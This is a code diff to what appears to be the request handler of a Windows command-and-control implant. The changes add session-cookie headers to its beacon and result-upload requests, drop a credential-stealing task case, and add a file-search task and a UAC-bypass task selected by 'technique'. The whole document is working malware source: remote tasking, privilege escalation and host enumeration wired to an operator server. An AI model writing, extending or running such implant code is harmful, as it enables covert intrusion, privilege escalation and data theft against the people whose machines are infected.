@@ -106,15 +106,20 @@ namespace Handler
             return FALSE;
         }
 
-        // Receive the agent UUID.
-        pState->wUUID = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
+        // Receive the agent UUID and session ID.
+        std::wstring wResp = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
+        json jResp = json::parse(Utils::Convert::UTF8Encode(wResp));
+        pState->wUUID = Utils::Convert::UTF8Decode(jResp["uuid"]);
+        pState->wSessionID = Utils::Convert::UTF8Decode(jResp["session_id"]);
         
         return TRUE;
     }
 
     BOOL TaskGet(State::PSTATE pState)
     {
-        std::wstring wHeader = L"X-UUID: " + pState->wUUID + L"\r\n";
+        std::wstring wHeader = L"";
+        wHeader += L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeader += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
 
         System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
@@ -194,9 +199,6 @@ namespace Handler
                     Utils::Convert::UTF8Decode(args["dest"])
                 );
                 break;
-            case TASK_CREDS_STEAL:
-                wTaskResult = Task::CredsSteal(pState);
-                break;
             case TASK_DLL:
                 wTaskResult = Task::Dll(
                     pState,
@@ -214,6 +216,13 @@ namespace Handler
                 break;
             case TASK_ENV_LS:
                 wTaskResult = Task::EnvLs(pState);
+                break;
+            case TASK_FIND:
+                wTaskResult = Task::Find(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["path"]),
+                    Utils::Convert::UTF8Decode(args["name"])
+                );
                 break;
             case TASK_GROUP_LS:
                 wTaskResult = Task::GroupLs();
@@ -349,6 +358,12 @@ namespace Handler
                     Utils::Convert::UTF8Decode(args["login"]) == L"true"
                 );
                 break;
+            case TASK_UAC:
+                wTaskResult = Task::Uac(
+                    pState,
+                    Utils::Convert::UTF8Decode(args["technique"])
+                );
+                break;
             case TASK_UPLOAD:
                 wTaskResult = Task::Upload(
                     pState,
@@ -384,6 +399,7 @@ namespace Handler
         // Prepare additional headers
         std::wstring wHeaders;
         wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
 
         // Encrypt task result
         std::string sTaskResultJSON = pState->taskResultJSON.dump();
